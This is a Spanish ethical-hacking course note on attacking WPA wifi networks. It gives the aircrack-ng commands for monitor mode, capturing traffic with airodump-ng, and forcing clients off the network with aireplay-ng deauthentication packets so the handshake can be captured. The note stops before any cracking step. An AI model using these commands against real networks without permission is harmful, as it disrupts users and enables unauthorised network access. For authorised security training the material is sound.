# FCEH_Unidad 24: Hacking Etico en Redes Wifi WPA

Repetimos los pasos anteriores hasta matar los procesos de la tarjeta de red para ponerla en modo monitor. 

Cuando nos de problemas debemos buscar los drivers del chipset para ponerla en modo monitor.

Para matar todos los procesos de una sola vez ponemos 

```bahs
airmong-ng check kill
```
hacemos el iwconfig para comprobar

buscamos las redes disponibles con 

```bash
airodump-ng wlan0mon
```
Así empieza a escuchar, y empieza a buscar los puntos de acceso. 

En otra terminal ponemos;
```bash
airodump-ng wlan0mon -w <ESSID de la red> -c <nº de canal>
```

De esta forma vamos capturando los *data* que se están enviando y donde salen datos sobre la clave de la wifi.

Lo que vamos a hacer con el siguiente comando es enviar paquetes para que se desconecte la wifi a atacar, de forma que la persona vuelva a identificarse en la red. Para ello usamos el siguiente comando:

```bash
aireplay-ng -0 10 -a <BSSID de la red a desconectar> -c <MAC de la estación a desconectar> wlan0mon
```
Con -0 decimos q es para desconectar y con 10 los paquetes que enviamos


si diese error poner el canal por el que está la wifi

```bash
iwconfig wlan0mon channel 
```

